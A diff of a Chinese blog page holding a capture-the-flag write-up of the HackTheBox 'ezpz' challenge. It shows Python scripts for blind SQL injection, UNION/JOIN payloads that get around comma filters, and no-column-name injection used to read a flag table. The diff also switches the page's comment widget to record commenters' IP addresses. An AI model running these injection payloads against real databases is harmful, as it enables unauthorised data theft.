@@ -467,35 +467,66 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>首先进入页面，发现有两个报错：<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error1"></p>
 <p>其中，第一个报错其实就是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP: Notice: Undefined variable</span><br></pre></td></tr></table></figure>
-<p>意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=<span class="keyword">array</span>(<span class="string">"ID"</span>=&gt;<span class="number">1234</span>);</span><br><span class="line"><span class="keyword">echo</span>($obj-&gt;IDS);<span class="comment">#此处访问一个未定义的IDS触发报错</span></span><br></pre></td></tr></table></figure>
+<pre><code>PHP: Notice: Undefined variable</code></pre><p>意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码</p>
+<pre><code class="php">&lt;?php
+$obj=array(&quot;ID&quot;=&gt;1234);
+echo($obj-&gt;IDS);#此处访问一个未定义的IDS触发报错</code></pre>
 <p>与</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=json_decode(<span class="string">"&#123;'ID':'1234'&#125;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;IDs;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+$obj=json_decode(&quot;{&#39;ID&#39;:&#39;1234&#39;}&quot;);
+echo $obj-&gt;IDs;</code></pre>
 <p>的返回都是：<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="报错"><br>所以我们才能看到回显。因此尝试构造数据吧。加上题目页面源码中提示了<code>Hint : base64_encode($data)</code>&gt;（或者我们把obj置为数组，也可以触发报错，提示我们数据需要<code>base64encode</code>）<br>经过尝试，可以发现是要对json数据编码。那我们传一个ID值为1的数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj&#x3D;eyJJRCI6ICIxIn0&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>而传<code>1&#39;</code>触发报错，传<code>1&quot;</code>无报错。确认是存在sql注入漏洞，且是单引号闭合类型。<br>于是，题目进入到了下一阶段，sql注入。<br>显然为了让我们的payload更方便，最好先写好exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://docker.hackthebox.eu:30163/index.php?obj="</span></span><br><span class="line">payload=<span class="string">"1"</span></span><br><span class="line">payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">url += payload</span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">print(body)</span><br></pre></td></tr></table></figure>
+<pre><code>?obj=eyJJRCI6ICIxIn0=</code></pre><p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>而传<code>1&#39;</code>触发报错，传<code>1&quot;</code>无报错。确认是存在sql注入漏洞，且是单引号闭合类型。<br>于是，题目进入到了下一阶段，sql注入。<br>显然为了让我们的payload更方便，最好先写好exp：</p>
+<pre><code class="python">import requests
+import json
+import base64
+from bs4 import BeautifulSoup
+
+url = &quot;http://docker.hackthebox.eu:30163/index.php?obj=&quot;
+payload=&quot;1&quot;
+payload = base64.b64encode(json.dumps({&quot;ID&quot;: payload}).encode(&#39;utf-8&#39;))
+payload = str(payload, &#39;utf-8&#39;)
+url += payload
+r = requests.get(url)
+soup = BeautifulSoup(r.text, &#39;html.parser&#39;)
+body = soup.find(&#39;body&#39;).text.strip()
+print(body)</code></pre>
 <p>于是通过FUZZ，发现存在不少过滤：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">，</span><br><span class="line">concat</span><br><span class="line">information_schema.tables</span><br><span class="line">where</span><br><span class="line">limit</span><br></pre></td></tr></table></figure>
-<p>而且以上过滤都是正则匹配，没法用招数绕过，只能找替代。<br>首先<code>order by</code>用<code>group by</code>代替，这点不难。得到字段数为2。逗号过滤就比较局限了，这意味着我们要么使用盲注，要么使用<code>join</code>注入。<code>information_schema.tables</code>在之前的swpuweb1中也见到过了，肯定存在对应的替代表可以让我们获取表名。但是<code>where, concat,limit</code>不太好解决。(其实到最后才发现，不需要应对这几个过滤)其中<code>concat</code>也许可以用<code>make_set()</code>起到连接字符串的效果。但是<code>make_set()</code>需要至少两个参数，也必须要逗号；而<code>where</code>等等过滤也不好办。</p>
+<pre><code>order by
+，
+concat
+information_schema.tables
+where
+limit</code></pre><p>而且以上过滤都是正则匹配，没法用招数绕过，只能找替代。<br>首先<code>order by</code>用<code>group by</code>代替，这点不难。得到字段数为2。逗号过滤就比较局限了，这意味着我们要么使用盲注，要么使用<code>join</code>注入。<code>information_schema.tables</code>在之前的swpuweb1中也见到过了，肯定存在对应的替代表可以让我们获取表名。但是<code>where, concat,limit</code>不太好解决。(其实到最后才发现，不需要应对这几个过滤)其中<code>concat</code>也许可以用<code>make_set()</code>起到连接字符串的效果。但是<code>make_set()</code>需要至少两个参数，也必须要逗号；而<code>where</code>等等过滤也不好办。</p>
 <p>总之先从简单的开始吧，我选择使用盲注爆出数据库名与版本号。<br>脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>, <span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://docker.hackthebox.eu:32614/index.php?obj="</span> <span class="comment">#10.3.20-MariaDB</span></span><br><span class="line">        payload = <span class="string">"1' and ascii(substr((select database()) from "</span>+str(i)+<span class="string">" for 1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">        url += payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Good'</span> <span class="keyword">in</span> body:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">for i in range(1,8):
+    print(i)
+    a=0
+    for j in range(95, 128):
+        url = &quot;http://docker.hackthebox.eu:32614/index.php?obj=&quot; #10.3.20-MariaDB
+        payload = &quot;1&#39; and ascii(substr((select database()) from &quot;+str(i)+&quot; for 1))=&quot; + str(j) + &quot;#&quot;
+        payload = base64.b64encode(json.dumps({&quot;ID&quot;: payload}).encode(&#39;utf-8&#39;))
+        payload = str(payload, &#39;utf-8&#39;)
+        url += payload
+        r = requests.get(url)
+        soup = BeautifulSoup(r.text, &#39;html.parser&#39;)
+        body = soup.find(&#39;body&#39;).text.strip()
+        if &#39;Good&#39; in body:
+            flag += chr(j)
+            print(flag)
+            a=1
+            break
+    if a==0:
+        break</code></pre>
 <p>由于不需要绕其他过滤，只需要用<code>select case from {0} for 1</code>代替<code>substr(case,{0},1)</code>。然而盲注脚本只能解决这两个问题，得不到表名，而且还贼慢，我只能另寻其他方法注入表名。</p>
 <p>考虑到逗号过滤时另一种方法，<code>join</code>注入，我们根据确认的两个<br>字段数构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot;</span><br></pre></td></tr></table></figure>
-<p>结果出乎我意料之外，回显出现了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2</span><br></pre></td></tr></table></figure>
-<p>也就是说第二个字段有回显……所以其实不需要盲注，直接根据回显union select做就好了。<br>所以下一步准备拿到表名，这里在我始终纠结于无法使用<code>group_concat()</code>要怎么拿到全部数据时，师傅的提示让我注意到了这里的报错函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 34</span><br></pre></td></tr></table></figure>
-<p>这里的sql注入是通过<code>mysqli_fetch_assoc()</code>达成的，其返回值为：返回代表读取行的关联数组。所以不需要concat，也可以得到一行注入得到的全部数据。<br>所以注入表名就不再担心那些问题，只要把<code>information_schema.tables</code>的代替找到就好(由于之前注入过版本，确认是10.3.20，可以用<code>mysql.innodb_table_stats</code>代替)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot;</span><br></pre></td></tr></table></figure>
-<p>得到表名的连接字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATAFlagTableUnguessableEzPZgtid_slave_pos</span><br></pre></td></tr></table></figure>
-<p>接下来由于<code>information_schema.columns</code>找不到替代方式，看来是跟swpu一样的无列名注入了。之前文章里也写过，而此处的无列名注入稍有区别，属于未过滤<code>`</code>反引号，过滤掉逗号的情况。所以模板是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39; union select * from (select 1)a join (select &#96;2&#96; from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;表名&#39;)i )b #</span><br></pre></td></tr></table></figure>
-<p>实际上这道题目与第五届上海市大学生网络安全大赛 easysql十分相像，因此可以作为参考。<br>下面一步就是要猜字段数跟表名了，首先判断表名，上网搜下发现<code>mysql.gtid_slave_pos</code>是一种系统表，所以估计最后一部分 <code>gtid_slave_pos</code>是一张表。之后按照这个模板不变，只改表名，发现<code>Data</code>是一张表。且内容就是我们之前回显的sql注入提示的内容，故刚好2个字段。<br>那么估计flag就在<code>FlagTableUnguessableEzPZ</code>这张表了，而且猜测一张有flag表只有一列，所以改成一个字段试试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"' UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from  FlagTableUnguessableEzPZ)x )n#"</span></span><br></pre></td></tr></table></figure>
+<pre><code>payload=&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot;</code></pre><p>结果出乎我意料之外，回显出现了</p>
+<pre><code>Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2</code></pre><p>也就是说第二个字段有回显……所以其实不需要盲注，直接根据回显union select做就好了。<br>所以下一步准备拿到表名，这里在我始终纠结于无法使用<code>group_concat()</code>要怎么拿到全部数据时，师傅的提示让我注意到了这里的报错函数：</p>
+<pre><code>Warning:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 34</code></pre><p>这里的sql注入是通过<code>mysqli_fetch_assoc()</code>达成的，其返回值为：返回代表读取行的关联数组。所以不需要concat，也可以得到一行注入得到的全部数据。<br>所以注入表名就不再担心那些问题，只要把<code>information_schema.tables</code>的代替找到就好(由于之前注入过版本，确认是10.3.20，可以用<code>mysql.innodb_table_stats</code>代替)</p>
+<pre><code>payload = &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot;</code></pre><p>得到表名的连接字符串</p>
+<pre><code>DATAFlagTableUnguessableEzPZgtid_slave_pos</code></pre><p>接下来由于<code>information_schema.columns</code>找不到替代方式，看来是跟swpu一样的无列名注入了。之前文章里也写过，而此处的无列名注入稍有区别，属于未过滤<code>`</code>反引号，过滤掉逗号的情况。所以模板是：</p>
+<pre><code>0&#39; union select * from (select 1)a join (select `2` from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;表名&#39;)i )b #</code></pre><p>实际上这道题目与第五届上海市大学生网络安全大赛 easysql十分相像，因此可以作为参考。<br>下面一步就是要猜字段数跟表名了，首先判断表名，上网搜下发现<code>mysql.gtid_slave_pos</code>是一种系统表，所以估计最后一部分 <code>gtid_slave_pos</code>是一张表。之后按照这个模板不变，只改表名，发现<code>Data</code>是一张表。且内容就是我们之前回显的sql注入提示的内容，故刚好2个字段。<br>那么估计flag就在<code>FlagTableUnguessableEzPZ</code>这张表了，而且猜测一张有flag表只有一列，所以改成一个字段试试</p>
+<pre><code class="python">payload=&quot;&#39; UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from  FlagTableUnguessableEzPZ)x )n#&quot;</code></pre>
 <p>成功拿到flag。</p>
 <p>总结下吧，这算是一道很有营养的题目了。如果能根据报错发现后面的sql注入，就算跨过了一大步，这些主要是对php特性的理解。而我在sql注入这一步上倒是也卡了好久……不过题目很好的帮我再一次复习了无列名注入这个有意思的知识点，以及<code>join</code>绕过逗号这一经典方法。看来可以作为bypass<code>information_schema</code>的常规武器使用了。</p>
 
@@ -694,7 +725,7 @@ easy_web进去后url有两个明显参数，第一个类似于base64编码，第
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -706,9 +737,9 @@ easy_web进去后url有两个明显参数，第一个类似于base64编码，第
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -841,6 +872,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1054,7 +1087,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1110,6 +1143,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
